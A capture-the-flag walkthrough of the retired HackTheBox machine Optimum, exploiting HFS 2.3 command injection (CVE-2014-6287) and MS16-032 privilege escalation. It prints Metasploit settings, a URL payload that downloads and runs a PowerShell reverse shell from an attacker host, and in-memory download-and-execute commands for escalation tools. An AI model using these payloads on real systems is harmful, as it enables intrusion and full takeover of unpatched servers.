# HackTheBox — Optimum

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** Web Exploitation / HFS RCE / MS16-032  
**Status:** Retired  

---

## Summary

Optimum runs HttpFileServer (HFS) 2.3, which has a well-known command injection vulnerability (CVE-2014-6287). Initial access is gained via this RCE. Privilege escalation uses MS16-032, a secondary logon handle privilege escalation in Windows Server 2012 R2.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/optimum 10.10.10.8
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
```

Only one port — HttpFileServer 2.3 on port 80.

---

## Exploitation

### CVE-2014-6287 — HFS 2.3 Remote Code Execution

HFS 2.3 uses a scripting language (VBScript/HFS macros) that evaluates user input in certain URL parameters without sanitization.

**Metasploit:**

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.10.10.8
set LHOST 10.10.14.X
set LPORT 4444
run
```

**Manual:**

The vulnerable parameter is in the search function:

```
http://10.10.10.8/?search=%00{.exec|powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.10.14.X/rev.ps1').}
```

Decode the URL properly and host a PowerShell reverse shell as `rev.ps1`.

---

## User Flag

```cmd
type C:\Users\kostas\Desktop\user.txt
```

---

## Privilege Escalation

### System Information

```cmd
systeminfo
```

```
OS Name: Microsoft Windows Server 2012 R2 Standard
OS Version: 6.3.9600 N/A Build 9600
```

### Sherlock / Watson

Use Sherlock (PowerShell) to find missing patches:

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.X/Sherlock.ps1')
Find-AllVulns
```

Returns **MS16-032** as vulnerable.

### MS16-032 — Secondary Logon Privilege Escalation

```powershell
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.X/MS16-032.ps1')
Invoke-MS16-032
```

Or use the pre-compiled binary:

```cmd
MS16-032.exe
```

**SYSTEM shell obtained.**

---

## Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- HttpFileServer (HFS) is a lightweight HTTP server common in CTF environments — always version-check it
- CVE-2014-6287 is a classic — the macro injection in HFS is well-documented with public PoCs
- Sherlock/Watson are PowerShell tools for automated local privilege escalation enumeration
- MS16-032 targets the Windows Secondary Logon service and works on many Windows Server 2012 R2 builds
- PowerShell `IEX(New-Object Net.WebClient).downloadString()` is the standard in-memory execution method

---

## CVE References

- **CVE-2014-6287** — HFS 2.3 Remote Code Execution
- **MS16-032 / CVE-2016-0099** — Windows Secondary Logon LPE

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| Metasploit | HFS RCE exploitation |
| Sherlock.ps1 | Missing patch enumeration |
| MS16-032.ps1 | Privilege escalation |
